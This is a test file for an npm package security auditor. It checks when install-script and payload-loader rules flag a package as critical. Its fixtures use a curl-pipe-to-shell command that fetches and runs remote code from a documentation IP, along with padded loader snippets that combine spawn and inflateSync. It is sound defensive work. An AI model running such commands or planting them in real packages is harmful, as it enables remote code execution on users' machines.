import assert from "node:assert/strict";
import { describe, test } from "node:test";
import { runRules } from "../src/index.js";
import type { AuditInput, PackageFile } from "../src/types.js";

// Core re-review: the suffix fallback must not turn benign hooks critical, and
// the overflow decode signal needs whole identifiers.

const CURL_SH = "curl -s http://198.51.100.1/x | sh"; // RFC 5737 documentation address

function file(path: string, content: string): PackageFile {
  return { path, content, size: Buffer.byteLength(content), changed: false };
}
function inputFor(files: Record<string, string>, pkgJson: object): AuditInput {
  const list = Object.entries(files).map(([p, c]) => file(p, c));
  list.push(file("package/package.json", JSON.stringify(pkgJson)));
  return {
    meta: {
      name: "probe", version: "1.0.0", author: null, maintainers: [], license: null,
      hasInstallScripts: false, signature: "unknown", provenance: "unknown", integrity: null,
      unpackedSize: 0, fileCount: list.length,
    },
    files: list,
    mode: "full",
  };
}
const crit = (files: Record<string, string>, cmd: string) =>
  runRules(inputFor(files, { scripts: { postinstall: cmd } })).filter((x) => x.ruleId === "install-scripts" && x.severity === "critical");

describe("the suffix fallback does not match bare command words or module specifiers", () => {
  const payload = `${CURL_SH}\n`;
  const rows: [string, Record<string, string>][] = [
    ["node-gyp rebuild", { "package/lib/node-gyp.js": payload }],
    ["npm run build", { "package/node_modules/npm/lib/npm.js": payload }],
    ["echo done", { "package/vendor/shelljs/src/echo.js": payload }],
    ["node -r dotenv/config setup.js", { "package/lib/dotenv/config.js": payload, "package/setup.js": "console.log(1)\n" }],
  ];
  for (const [cmd, files] of rows) {
    test(`\`${cmd}\` stays non-critical`, () => {
      assert.equal(crit(files, cmd).length, 0);
    });
  }

  test("path-qualified words, interpreter scripts and code operands still use the suffix fallback", () => {
    assert.equal(crit({ "package/scripts/setup": payload }, "cd scripts && ./setup").length, 1);
    assert.equal(crit({ "package/scripts/setup.sh": payload }, "cd scripts && sh setup.sh").length, 1);
    assert.equal(crit({ "package/scripts/run.js": payload }, "cd scripts; node run").length, 1);
    assert.equal(crit({ "package/lib/x.js": payload }, "sudo node x.js").length, 1);
  });

  test("a relative `-r` value still resolves, a bare specifier does not", () => {
    assert.equal(crit({ "package/hook.js": payload, "package/main.js": "x\n" }, "node -r ./hook.js main.js").length, 1);
  });

  test("an unrecognized `--flag=./code.js` value is scanned; a bare specifier value is not", () => {
    const files = { "package/reporter.js": `${CURL_SH}\n`, "package/test.js": "x\n" };
    assert.equal(crit(files, "node --test --test-reporter=./reporter.js test.js").length, 1);
    assert.equal(crit({ "package/node_modules/r/reporter.js": `${CURL_SH}\n`, "package/test.js": "x\n" }, "node --test-reporter=r/reporter.js test.js").length, 0);
  });

  test("a bare command word matches only an exact package file", () => {
    assert.equal(crit({ "package/setup": payload }, "setup").length, 1);
    assert.equal(crit({ "package/setup.js": payload }, "setup").length, 0, "a shell never appends .js");
  });
});

describe("overflow decode signal needs a whole identifier", () => {
  const PAD = `try{x${".b".repeat(60000)}}catch(e){}\n`;
  const loader = (src: string) =>
    runRules(inputFor({ "package/index.js": src }, { name: "p", main: "index.js" })).filter((f) => f.ruleId === "native-payload-loader");

  test("`inflated` in a comment is not a decode", () => {
    const f = loader(`${PAD}const {readFileSync:r,writeFileSync:w}=require("fs");const {spawn:go}=require("child_process"); // inflated data\n`);
    assert.ok(!f.some((x) => x.severity === "critical"));
  });

  test("the real identifier still counts", () => {
    const f = loader(`${PAD}const {readFileSync:r,writeFileSync:w}=require("fs");const {spawn:go}=require("child_process");const {inflateSync:g}=require("zlib");\n`);
    assert.ok(f.some((x) => x.severity === "critical"));
  });
});

describe("input redirection attached to a script path", () => {
  test("`node <setup.js` and `sh <build.sh` scan the redirected script", () => {
    assert.equal(crit({ "package/setup.js": `${CURL_SH}\n` }, "node <setup.js").length, 1);
    assert.equal(crit({ "package/build.sh": `${CURL_SH}\n` }, "sh <build.sh").length, 1);
  });
});

describe("a redirect target never replaces the script operand", () => {
  test("`node <README.md setup` still scans setup", () => {
    assert.equal(crit({ "package/README.md": "docs\n", "package/setup": `${CURL_SH}\n` }, "node <README.md setup").length, 1);
  });
  test("`node build.js > out.js` does not scan the output target", () => {
    assert.equal(crit({ "package/build.js": "console.log(1)\n", "package/out.js": `${CURL_SH}\n` }, "node build.js > out.js").length, 0);
  });
});

describe("a quoted redirect character is a literal file name", () => {
  test("`node \">evil.js\"` scans the file literally named >evil.js", () => {
    assert.equal(crit({ "package/>evil.js": `${CURL_SH}\n` }, 'node ">evil.js"').length, 1);
  });
});

describe("a preload path inside an environment assignment", () => {
  test("`NODE_OPTIONS=--require=./hook.js node -v` scans hook.js", () => {
    assert.equal(crit({ "package/hook.js": `${CURL_SH}\n` }, "NODE_OPTIONS=--require=./hook.js node -v").length, 1);
  });
  test("a bare specifier in NODE_OPTIONS resolves inside the tarball only: a benign bundled module is clean, an unshipped one resolves nothing", () => {
    assert.equal(crit({ "package/node_modules/x/hook.js": "module.exports = 1\n" }, "NODE_OPTIONS=--require=x/hook.js node -v").length, 0);
    assert.equal(crit({ "package/lib/x/hook.js": `${CURL_SH}\n` }, "NODE_OPTIONS=--require=x/hook.js node -v").length, 0);
  });
});
